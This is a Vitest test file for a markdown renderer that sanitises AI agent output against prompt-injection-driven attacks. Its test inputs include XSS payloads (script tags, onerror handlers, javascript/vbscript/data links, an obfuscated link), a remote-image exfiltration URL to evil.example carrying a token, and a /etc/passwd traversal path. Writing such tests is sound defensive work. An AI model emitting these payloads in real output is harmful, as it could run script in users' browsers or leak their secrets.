// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown';

// Agent output can be steered by prompt injection, so treat it as hostile.

function dom(html: string): HTMLElement {
  const div = document.createElement('div');
  div.innerHTML = html;
  return div;
}

describe('renderMarkdown', () => {
  it.each([
    ['script tags', '<script>alert(1)</script>'],
    ['event handlers', '<img src=x onerror=alert(1)>'],
    ['svg payloads', '<svg><script>alert(1)</script></svg>'],
    ['iframes', '<iframe src="https://evil.example"></iframe>'],
    ['javascript links', '[click](javascript:alert(1))'],
    ['data links', '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript links', '[click](vbscript:msgbox(1))'],
    ['obfuscated javascript links', '[click](JaVaScRiPt&colon;alert(1))'],
    ['html inside code fences', '```\n</code></pre><script>alert(1)</script>\n```'],
    ['style injection', '<style>body{display:none}</style>'],
    ['forms', '<form action="https://evil.example"><input name=x></form>'],
  ])('neutralizes %s', (_name, input) => {
    const root = dom(renderMarkdown(input));
    expect(root.querySelector('script, iframe, svg, style, form, input, object, embed')).toBeNull();
    for (const el of root.querySelectorAll('*')) {
      for (const attr of el.attributes) {
        expect(attr.name.startsWith('on')).toBe(false);
        if (attr.name === 'href' || attr.name === 'src') expect(attr.value).toMatch(/^(https?:|mailto:)/i);
      }
    }
  });

  it('never loads remote images (no tracking pixels or data exfiltration)', () => {
    const root = dom(renderMarkdown('![secret](https://evil.example/leak?token=abc)'));
    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('a')?.getAttribute('href')).toBe('https://evil.example/leak?token=abc');
  });

  it('opens links in a new tab without opener access', () => {
    const a = dom(renderMarkdown('[docs](https://example.com)')).querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer nofollow');
  });

  it('keeps useful formatting', () => {
    const root = dom(renderMarkdown('# Title\n\n- **bold** item\n\n```ts\nconst x = 1 < 2;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |'));
    expect(root.querySelector('h1')?.textContent).toBe('Title');
    expect(root.querySelector('strong')?.textContent).toBe('bold');
    expect(root.querySelector('.md-code code')?.textContent).toBe('const x = 1 < 2;\n');
    expect(root.querySelector('.md-code-bar span')?.textContent).toBe('ts');
    expect(root.querySelector('table td')?.textContent).toBe('1');
  });
});

describe('images from your machine', () => {
  const signed = '/api/media/hermes/20260927_080000_abcdef?p=L2hvbWUvbWUveC5wbmc&s=Ab_c-1';

  it('leave a placeholder for links the server signed, never an image source', () => {
    const root = dom(renderMarkdown(`![p95 latency](${signed})`));
    const el = root.querySelector<HTMLElement>('.md-media');
    expect(el?.dataset.media).toBe(signed);
    expect(el?.getAttribute('aria-label')).toBe('p95 latency');
    expect(root.querySelector('img, [src], [href]')).toBeNull();
  });

  it('never turn a raw local path into a link or an image', () => {
    const root = dom(renderMarkdown('![x](/home/me/x.png) and [y](/home/me/y.png) and file:///home/me/z.png'));
    expect(root.querySelector('a, .md-media, img')).toBeNull();
  });

  it('keep only the text of a plain link to a signed image', () => {
    const root = dom(renderMarkdown(`[the chart](${signed}) and [docs](https://example.com)`));
    expect([...root.querySelectorAll('a')].map((a) => a.getAttribute('href'))).toEqual(['https://example.com']);
    expect(root.textContent).toContain('the chart and docs');
  });

  it.each([
    '/api/media/../etc/passwd?p=x&s=y',
    '/api/media/hermes/a?p=x&s=y&then=more',
    '//evil.example/api/media/hermes/a?p=x&s=y',
    '/api/mediax/hermes/a?p=x&s=y',
    'https://evil.example/api/media/hermes/a?p=x&s=y',
  ])('ignore %s, which only looks like one', (src) => {
    expect(dom(renderMarkdown(`![x](${src})`)).querySelector('.md-media')).toBeNull();
  });

  it('keep alt text as text', () => {
    const root = dom(renderMarkdown(`![q"><img src=x onerror=alert(1)>](${signed})`));
    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('.md-media')?.getAttribute('data-alt')).toBe('q"><img src=x onerror=alert(1)>');
  });

  it('drop data attributes nobody asked for', () => {
    const html = renderMarkdown('```\ncode\n```');
    expect(dom(html).querySelector('[data-copy]')).not.toBeNull();
    expect(html).not.toMatch(/data-(?!copy)/);
  });
});
